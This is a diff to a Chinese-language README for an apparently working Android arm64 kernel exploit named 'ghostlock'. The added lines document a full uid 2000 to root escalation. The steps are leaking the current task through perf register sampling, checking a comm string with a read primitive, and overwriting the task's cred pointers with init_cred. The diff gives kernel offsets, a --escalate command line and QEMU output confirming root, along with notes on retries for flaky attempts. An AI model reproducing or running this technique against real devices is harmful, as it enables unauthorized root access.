@@ -144,6 +144,37 @@ EDEADLK、walk 成功、hrtimer 超时、载体拷贝成功后才因假地址组
 mode=0444` → 常量 `0x0000012400000010`）读回，再用 `restore` 步骤指回
 `sysctl_bootid`。
 
+### 端到端提权（uid 2000 → 0，QEMU 已验证）
+
+`--escalate`（设备 shell 路径同款，全程无 RT）：
+
+1. **perf 泄露 current**：`PERF_COUNT_SW_CPU_CLOCK` + `PERF_SAMPLE_REGS_INTR`
+   （arm64 33 个寄存器），触发器用 `nanosleep(1µs)`（单任务时 `sched_yield`
+   不进 `__schedule`）。取 `__schedule` 内 `x27`：`mrs x27, sp_el0` 在 +0x40，
+   但 +0x68 的 `ldr w8, [x27, 0x50]!` 会把 x27 抬 0x50，需减回；候选要求
+   64 字节对齐。
+2. **comm 校验**：用读原语读候选 `task+0x990`，等于 `"ghostloc"` 才继续
+   （读的副作用写坏 comm 高 8 字节，只影响进程名显示）。
+3. **cred 指针写**：`task+0x980`(real_cred) / `task+0x988`(cred) ← `init_cred`
+   （0xffffff800b42e9c0），随后本进程 `getuid()==0`。
+4. **修复**：指针写副作用把 `init_cred+8`(gid) 覆盖成目标地址，用 leaf 零写
+   还原；最后把 boot_id `.data` 指回 `sysctl_bootid`。
+
+QEMU 实测（`--no-rt --attempts 4`，uid 2000 起跑）：
+
+```text
+escalate: candidate 1/1 task=ffffffc07a373240 (n=12)
+slide read8 boot_id ... lo=636f6c74736f6867 ...  ok=1        # "ghostloc" 确认
+slide escalate-cred attempt 1 ok=1 ... target=ffffffc07a373bc8
+slide child pid=246 uid=0 ...                                # 之后的子进程已是 root
+init: ghostlock_exe exited status=0x0 (SUCCESS)              # wrapper 独立退出码标记
+```
+
+失败模式（flaky）：约每几次 attempt 会有一次 walk 卡在
+`rt_mutex_adjust_prio_chain` 的 `raw_spin_trylock` 重试循环（fake waiter 被
+返回路径 clobber），表现为该 attempt 超时；靠 `--attempts N` 重试（设备端同
+mrx：重试到成功）。
+
 历史验证（均已注入，仅存档）：QEMU GDB 直写悬空 blk；实机 KPM 重建 overlay。
 
 ### 关键偏移（boot.elf 反汇编实测，`exploit/ghostlock-source/src/target.h`）
@@ -225,6 +256,9 @@ make                      # NDK r29 / host clang；LOGCAT=1（logcat）默认
 ./ghostlock_exe --verify-leaf          # *(bootid+0) := 0
 ./ghostlock_exe --verify-read          # boot_id .data 指针重定向 -> 读回
 
+# 端到端提权（QEMU 已验证）：perf 泄露自己 task -> comm 校验 -> cred 写
+./ghostlock_exe --escalate --no-rt --attempts 4
+
 # 示例组合
 ./ghostlock_exe --verify-write --attempts 5 --no-rt --hold
 ./ghostlock_exe --verify-all --probe-cycle \
@@ -236,7 +270,7 @@ make                      # NDK r29 / host clang；LOGCAT=1（logcat）默认
 `--wait-seconds N`、`--requeue-ms N`、`--no-rt`、`--rt-prio N`、
 `--probe-cycle`（kernel.patched/QEMU 必需）、`--noconsume`、`--hold`、
 `--detach`、`--fsync`、`--verify-write`、`--verify-leaf`、`--verify-read`、
-`--verify-all`。**环境变量已全部移除**（含旧 `GOT_*` 实验开关）。
+`--verify-all`、`--escalate`。**环境变量已全部移除**（含旧 `GOT_*` 实验开关）。
 
 QEMU 以本程序做 /init 时注意：内核没有控制台，fd 0/1/2 可能未打开，
 需在 wrapper 里先补上可用 fd（否则 `pipe()` 会占用 fd 0/1，子进程的
